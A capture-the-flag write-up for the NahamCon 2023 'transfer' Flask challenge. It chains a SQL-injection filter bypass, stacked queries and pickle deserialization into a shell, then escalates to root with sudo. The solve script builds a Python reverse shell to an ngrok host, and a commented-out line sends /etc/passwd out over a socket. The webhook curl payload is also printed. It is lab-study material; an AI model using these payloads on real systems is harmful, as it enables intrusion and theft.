# NahamCon CTF 2023

## ChallengeName: transfer

### ChallengeDiscription: 
 - Escalate your privileges and find the flag.

 **The challenge source code avilavle**

- Technologies used flask and sqlite




 Once I locked into code I found that it's just filtering single-qoutes and spaces
 in loging part

 ```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")

@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

 ```

 - to bypass single-qoute use `\` because they're replacing `\` with `'`
 - to bypass spaces add comment betweeen words to separate them `/**/`
 example `SELECT/**/username/**/WHERE.....`



 - Going further in code analyzing found that I can't bypass loging because they used `executescript` and  `fetchone` methods together
 means that you can't loging even if you have a username and a password because `fetchone` value will always be `None` it only works with `execute` not `executescript`

 ```python
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    c.executescript(sql)
    user = c.fetchone()
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
        
        session['username'] = username
        session['session_id'] = session_id
        conn.commit()
        return redirect(url_for('files'))
    else:
        flash('Username or password is incorrect')
        return redirect(url_for('home'))

 ```

 - The adventage here is `executescript`  accepts multiple queries at once!!!

in app.py our source code there's an insert to database it's file named `flag.txt` but it's value is just simple text

```python
c.execute("INSERT OR IGNORE INTO files VALUES ('flag.txt', ?, NULL)",
                  (base64.b64encode(pickle.dumps(b'lol just kidding this isnt really where the flag is')).decode('utf-8'),))
```

- Now let's go to another indpoint which is

```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
```
 with this indpoint we can read a flag tabel if we have a valid `sessionId`

 - So the only way is to create a new one but how???

using the password parameter and `executescript` method we discussed above

the pyload will be something like:
```sql
password';INSERT/**/INTO/**/activesessions/**/(sessionid,/**/timestamp)/**/VALUES/**/('c373e6e3-d0ed-442a-a9b4-f64d643d7111',/**/'2023-06-17/**/22:39:01.841728');--
```

but when I try to read the flag server cruched because of a deprecated argument in `send_file` `download_name`

but after a discuss with my friend `@BlackHole1004` he toled me about an rce in `pickle.loads`
it simply diserialized an object if that serialized with `pickle.dumps`

```python
class RCE:
	def __reduce__(self):
		cmd = ("curl https://webhook.site/[id]")
		return os.system, (cmd,)

command = base64.b64encode(pickle.dumps(RCE())).decode('utf-8') #serialized object 

```
the problem is when I try `curl` `wget` `nc` no one were instaled 
so I used python socket to read a file firs to check if my payload is working and yeah 

## Solution 

step 1 insert our reverse-shell payload serialized object into files table
step 2 insert new sessionId to activesessions table so that we can read our file which is our rce object
step 3 start listen on my ngrok url and port and run script 


`solve.py`:
```python
import requests
import uuid
from datetime import datetime, timedelta
import pickle
import base64
import os
import random
import string

def generate_random_string(length):
	characters = string.ascii_letters
	return ''.join(random.choice(characters) for _ in range(length))

class RCE:
	def __reduce__(self):
		# cmd = ("python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));s.send(open('/etc/passwd','rb').read())\"")
		cmd = ("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"")
		return os.system, (cmd,)

command = base64.b64encode(pickle.dumps(RCE())).decode('utf-8')

print(command)


def DBClean(string):
	for bad_char in " '\"":
		string = string.replace(bad_char,"")
	return string.replace("\\", "'")


password = "pass"
session_id = str(uuid.uuid4())
session = f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')"


filename = generate_random_string(5)
print(filename)

add = f"INSERT OR IGNORE INTO files VALUES ('" + filename + "', '" + command + "', NULL)"

input = "admin';" + session + ";" + add + ";--"

password = input.replace(" ", "/**/").replace("'","\\")
print(password)
user = 'admin'


sql = f"SELECT * FROM users WHERE username='{DBClean(user)}' AND password='{DBClean(password)}'"
print('\n=================================================================\n')
print(sql)

url = 'http://challenge.nahamcon.com:30939/login'
data = {
	'username': 'adminn',
	'password': password
}

response = requests.post(url, data=data)
if response.status_code == 200:
	print('Login successful!')
	print(response.text)

	# Second request
	print("\n\n++++++++++++++++++ try reading flag ++++++++++++++++++++++\n\n")
	url = 'http://challenge.nahamcon.com:30939/download/' + filename +'/' + session_id
	response = requests.get(url)
	if response.status_code == 200:
		print('Download successful!')
		content = response.content
		print("content")
		print(content)
	else:
		print('Download failed. Status code:', response.text)

else:
	print('Login failed. Status code:', response.status_code)

```

- I got a shell I check the database and it wasn't contain any flag

I took a look again into challenge discription and I `escalate your privilages to get the flag`


`sudo -l` and yeah it was `ALL nopassword` 


```shell
sudo /bin/bash
id
# I'm root
```
I changed directory to `/root`
and I found the flag

